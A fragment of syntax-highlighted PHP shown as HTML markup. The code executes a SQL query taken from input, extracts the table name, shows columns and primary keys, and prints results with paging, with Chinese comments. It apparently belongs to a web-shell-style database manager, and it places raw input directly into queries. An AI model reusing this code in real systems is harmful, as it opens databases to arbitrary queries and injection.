<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;p&gt;&lt;b&gt;Query#{$num} : "</span>.<span style="color: #4d4d4c; background-color: #ffffff;">htmlspecialchars(</span>$<span style="color: #eab700;">query</span>,<span style="color: #4271ae;">EN</span><span style="color: #4271ae; text-decoration: underline;">T_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">"&lt;/b&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">switch</span>(<span style="color: #4d4d4c; background-color: #ffffff;">qy(</span>$<span style="color: #eab700;">query</span>))
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">case</span> <span style="color: #4271ae;">0</span>:
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Error : '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">mysql_error(</span>).<span style="color: #3e999f;">'&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">break</span>;<span style="color: #c82829; background-color: #d6d6d6;">  </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">case</span> <span style="color: #4271ae;">1</span>:
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">strtolower(substr(</span>$<span style="color: #eab700;">query</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0</span>,<span style="color: #4d4d4c; background-color: #ffffff;">13</span>)) == <span style="color: #3e999f;">'sele</span><span style="color: #3e999f; text-decoration: underline;">ct * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">allowedit</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">getnumsql</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tatol</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_num_rows(q(</span>$<span style="color: #eab700;">getnumsql</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">multipage</span> = <span style="color: #4d4d4c; background-color: #ffffff;">multi(</span>$<span style="color: #eab700;">tatol</span>, $<span style="color: #eab700;">pagenum</span>, $<span style="color: #eab700;">pa</span><span style="color: #eab700; text-decoration: underline;">ge</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">tablename</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">sql_line</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(array(</span><span style="color: #3e999f;">"\r"</span>, <span style="color: #3e999f;">"\n"</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">"\t"</span><span style="text-decoration: underline;">), </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">array(</span><span style="color: #3e999f; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">' '</span><span style="text-decoration: underline;">), </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">trim(htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">query</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">sql_line</span> = <span style="color: #4d4d4c; background-color: #ffffff;">preg_replace(</span><span style="color: #3e999f;">"/\/\*[^(\*\/)]</span><span style="color: #3e999f; text-decoration: underline;">*\*\//i"</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">" "</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">preg_match_all(</span><span style="color: #3e999f;">"/from\s+`{0,1}([\w]+)`{0</span><span style="color: #3e999f; text-decoration: underline;">,1}\s+/i"</span><span style="text-decoration: underline;">,$</span><span style="color: #eab700; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">,$</span><span style="color: #eab700; text-decoration: underline;">matches</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tablename</span> = $<span style="color: #eab700;">matches</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>][<span style="color: #4d4d4c; background-color: #ffffff;">0</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">/*********************</span><span style="color: #8e908c; font-style: italic;">/</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">getfield</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SHOW COLUMNS FROM $tablename"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">keyfied</span> = <span style="color: #3e999f;">''</span>; <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#20027;&#38190;&#23383;&#27573;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">row</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_assoc(</span>$<span style="color: #eab700;">getfield</span>)) <span style="text-decoration: underline;">{</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span>[$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>]][<span style="color: #3e999f;">'Key'</span>] = $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Key</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span>[$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>]][<span style="color: #3e999f;">'Extra'</span>] = $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'E</span><span style="color: #3e999f; text-decoration: underline;">xtra'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Key'</span>] == <span style="color: #3e999f;">'UNI'</span> || $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Key'</span>] <span style="text-decoration: underline;">== </span><span style="color: #3e999f; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">keyfied</span> = $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">/*********************</span><span style="color: #8e908c; font-style: italic;">/</span><span style="color: #c82829; background-color: #d6d6d6;">                     </span><span style="color: #c82829; background-color: #d6d6d6; text-decoration: underline;">            </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">keyfied</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">strtolower(substr(</span>$<span style="color: #eab700;">query</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0</span>,<span style="color: #4d4d4c; background-color: #ffffff;">1</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">3</span><span style="text-decoration: underline;">)) == </span><span style="color: #3e999f; text-decoration: underline;">'select * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">query</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">" LIMIT "</span>, <span style="color: #3e999f;">" order </span><span style="color: #3e999f; text-decoration: underline;">by $keyfied DESC LIMIT "</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">query</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span>$<span style="color: #eab700;">query</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">multipage</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;table border="0" cellpadding="3" cellspa</span><span style="color: #3e999f; text-decoration: underline;">cing="0"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">allowedit</span>) <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fieldnum</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_num_fields(</span>$<span style="color: #eab700;">result</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">i</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;$<span style="color: #eab700;">i</span>&lt;$<span style="color: #eab700;">fieldnum</span>;$<span style="color: #eab700;">i</span>++){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">name</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_field_name(</span>$<span style="color: #eab700;">result</span>, $<span style="color: #eab700;">i</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">type</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_field_type(</span>$<span style="color: #eab700;">result</span>, $<span style="color: #eab700;">i</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">len</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_field_len(</span>$<span style="color: #eab700;">result</span>, $<span style="color: #eab700;">i</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #3e999f; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #3e999f; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #eab700; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: 